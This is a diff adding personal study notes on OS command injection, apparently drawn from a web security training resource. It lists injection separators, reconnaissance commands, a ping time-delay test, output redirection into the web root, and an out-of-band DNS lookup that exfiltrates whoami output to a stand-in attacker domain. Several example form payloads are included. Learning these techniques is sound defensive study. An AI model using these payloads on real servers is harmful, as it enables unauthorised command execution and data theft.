@@ -1,0 +1,59 @@
+#                 What is OS command injection?
+
+#OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.
+
+# The & character is a shell command separator.
+
+
+Purpose of command 	  Linux 	     Windows
+Name of current user 	whoami 	     whoami
+Operating system 	    uname -a 	   ver
+Network configuration ifconfig 	   ipconfig /all
+Network connections 	netstat -an  netstat -an
+Running processes 	  ps -ef 	     tasklist 
+
+                Blind OS command injection vulnerabilities
+                
+#Detecting blind OS command injection using time delays
+#& ping -c 10 127.0.0.1 & //This command will cause the application to ping its loopback network adapter for 10 seconds. 
+#EXAMPLE
+#csrf=GzH4VwLdVi21RiXJJGO2R69nc9FxnIce&name=Abdulrazack&email=sulaimanabdulrazack1%40gmail.com||ping+-c+10+127.0.0.1||&subject=cybersec&message=diof
+
+#                Exploiting blind OS command injection by redirecting output
+
+#You can redirect the output from the injected command into a file within the web root that you can then retrieve using your browser. 
+For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input: 
+
+Example:& whoami > /var/www/static/whoami.txt &
+
+#The > character sends the output from the whoami command to the specified file. 
+You can then use your browser to fetch https://vulnerable-website.com/whoami.txt to retrieve the file, and view the output from the injected command. 
+
+#email=||whoami>/var/www/images/output.txt||
+
+#             Exploiting blind OS command injection using out-of-band (OAST) techniques
+#
+# You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
+& nslookup kgji2ohoyw.web-attacker.com &
+
+#EXAMPLE: email=x||nslookup+x.burpcollaborator.net||
+
+# The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
+# EXAMPLE : & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+
+# This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:
+# wwwuser.kgji2ohoyw.web-attacker.com
+
+
+#       Ways of injecting OS comman
+## FOR BOTH WINDOW AND LINUX
+# & OR && OR | OR ||
+
+##   FOR LINUX ONLY
+# ;
+# Newline (0x0a or \n) 
+# `iNJECTED COMMAND`
+# $INJECTED COMMAND$
+
+NOTE: Sometimes, the input that you control appears within quotation marks in the original command. 
+In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 
